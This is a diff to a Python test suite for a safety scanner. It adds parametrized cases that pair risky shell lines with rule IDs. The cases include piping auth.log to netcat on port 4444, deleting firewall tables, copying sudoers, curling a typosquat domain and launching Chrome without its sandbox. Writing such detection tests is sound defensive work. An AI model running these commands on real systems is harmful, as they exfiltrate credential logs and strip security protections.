@@ -717,6 +717,11 @@ class TestSafetyChecks:
             ("nft delete table inet filter\n", "SEC-593"),
             ("cp sudoers /tmp/\n", "SEC-594"),
             ("cat auth.log | nc host 4444\n", "SEC-595"),
+            ("curl http://typosquat.com\n", "SEC-596"),
+            ("dig rebind.example.com\n", "SEC-597"),
+            ("squid -p 8080 localhost\n", "SEC-598"),
+            ("chrome --no-sandbox http://x.com\n", "SEC-599"),
+            ("openssl s_client cert.pem\n", "SEC-600"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
